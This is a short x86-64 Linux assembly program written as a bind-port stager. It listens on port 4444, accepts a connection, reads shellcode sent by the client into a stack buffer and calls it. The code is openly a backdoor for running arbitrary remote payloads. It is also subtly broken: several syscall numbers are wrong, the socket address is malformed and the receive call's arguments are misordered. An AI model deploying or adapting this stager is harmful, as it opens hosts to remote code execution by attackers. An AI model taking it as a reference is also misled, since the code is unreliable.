section .data
    port        db      "4444",0
    addr        db      0,0,0,0,0,0,0,0
    s           dd      0

section .text
    global _start

_start:
    ; Create socket
    mov rax, 2          ; sys_socket call
    mov rdi, 2          ; AF_INET
    mov rsi, 1          ; SOCK_STREAM
    xor rdx, rdx        ; Protocol 0
    syscall
    mov r14, rax        ; Save the socket file descriptor

    ; Bind socket to address
    mov rax, 48         ; sys_bind call
    mov rdi, r14        ; File descriptor
    mov rsi, addr      ; Address to bind
    mov rdx, 16         ; Length of address
    syscall

    ; Listen on socket
    mov rax, 4          ; sys_listen call
    mov rdi, r14        ; File descriptor
    mov rsi, 1          ; Max backlog
    syscall

    ; Accept incoming connection
    mov rax, 5          ; sys_accept call
    mov rdi, r14        ; Listening socket file descriptor
    mov rsi, 0          ; No address structure needed
    mov rdx, 0          ; No address length needed
    syscall
    mov rbx, rax        ; Save client socket file descriptor

    ; Receive shellcode
    lea rdi, [rbp-0x100] ; Buffer for shellcode
    mov rsi, rbx        ; Client socket file descriptor
    mov rdx, 1024       ; Length of buffer
    mov rax, 0x29       ; sys_recvfrom call
    syscall
    mov rsi, rax        ; Save number of bytes received

    ; Execute shellcode
    lea rdi, [rbp-0x100] ; Pointer to shellcode
    xor rax, rax        ; Zero out RAX
    call rdi            ; Call shellcode

    ; Close sockets
    mov rax, 3          ; sys_close call
    mov rdi, r14        ; Listening socket file descriptor
    syscall
    mov rax, 3          ; sys_close call
    mov rdi, rbx        ; Client socket file descriptor
    syscall

    ; Exit program
    mov rax, 60         ; sys_exit call
    xor rdi, rdi        ; Return code 0
    syscall
